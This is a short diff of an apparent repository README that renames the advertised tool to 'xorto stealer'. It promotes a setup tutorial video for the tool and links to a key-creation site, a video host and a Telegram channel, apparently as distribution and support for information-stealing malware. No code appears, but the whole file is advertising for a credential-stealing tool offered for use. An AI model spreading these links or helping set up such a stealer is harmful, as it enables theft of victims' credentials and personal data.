@@ -1,5 +1,5 @@
 Don't forget to star for new updates
-Tutorial video on setting up fewer stealer 
+Tutorial video on setting up xorto stealer 
 https://xortoproject.xyz/createkey
 https://streamable.com/2n8j4e
 xorto stealer telegram : https://t.me/xortoproject
